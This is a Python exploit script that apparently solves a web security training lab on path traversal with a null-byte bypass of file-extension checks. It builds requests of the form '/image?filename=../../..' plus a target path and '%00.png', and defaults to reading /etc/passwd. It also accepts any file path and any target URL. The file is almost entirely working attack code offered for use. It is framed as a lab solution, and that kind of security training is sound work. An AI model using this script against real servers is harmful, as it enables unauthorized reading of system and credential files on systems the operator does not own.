# File path traversal, validation of file extension with null byte bypass

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def read_file(s, url, file):
	file_path = url + '/image?filename=../../..'
	if file == 'SOLUTION':
		file = '/etc/passwd'
	suffix = '%00.png'
	payload = file + suffix
	print('[+] Trying to read %s on the target server...' % payload)
	print('\n[+] Sending GET request to "%s"' % (file_path + payload))
	r = s.get(file_path + payload)
	print('[+] Server response:\n\n%s' % r.text)

def show_usage():
	print('[+] Usage: %s <URL> <FILE>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com /etc/hostname' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: File path traversal, validation of file extension with null byte bypass')
	try:
		url = sys.argv[1].strip()
		file = sys.argv[2].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Directory Traversal attack ...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = read_file(s, url, file)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
